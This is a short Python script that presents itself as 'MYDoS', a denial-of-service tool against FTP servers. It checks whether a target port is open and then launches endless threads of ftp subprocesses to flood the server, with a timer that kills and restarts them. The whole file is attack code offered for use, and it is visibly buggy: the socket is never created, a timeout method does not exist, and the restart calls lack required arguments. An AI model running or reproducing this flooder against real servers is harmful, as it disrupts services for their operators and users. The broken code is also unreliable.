import socket
import sys
import threading
import subprocess
import time



banner = """

|------------------|
|       MYDoS      |
|                  |
|------------------|global start
|By     da3rny     |
|------------------|

"""

usage = "{} <TARGET> <PORT(DEFAULT = 21)> <MAX_CONNECTIONS(DEFAULT = 50)>".format(sys.argv[0])

def test(t, p):
    s = socket.socket
    s.timeout(10)
    try:
        s.connect((t, p))
        response = s.recv(65535)
        s.close()
        return 0
    except socket.error:
        print("Port {} is not open or may be blocking our connection, please try again with making sure that you specified a port that is open.".format(p))
        sys.exit()

def attack(target, port, id):
    try:
        subprocess.Popen("ftp {0} {1}".format(target, port), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except OSError: pass

global target, port, start
print(banner)
try:
    target = sys.argv[1]
except:
    print(usage)
    sys.exit()

try:
    port = int(sys.argv[2])
except:
    port = 21

try:
    conns = int(sys.argv[3])
except:
    conns = 50

print("[!] Testing if {0}:{1} is open".format(target, port))
test(target, port)
print("[+] Port {} is open, starting attack...".format(port))
time.sleep(2)
print("[+] Attack started on {0}:{1}!".format(target, port))
def loop(target, port, connections):
    global start
    threading.Thread(target=timer).start()
    while 1:
        for i in range(1, conns + 3):
            t = threading.Thread(target=attack, args=(target, port, i,))
            t.start()
            if i > conns + 2:
                t.join()
                break
                loop()

t = threading.Thread(target = loop, args=(target, port, conns))
t.start()

def timer():
    start = time.time()
    while 1:
        if start < time.time() + float(900): pass
        else:
            subprocess.Popen("pkill ftp", shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            t = threading.Thread(target=loop, args=(target, port,))
        t.start()
        break

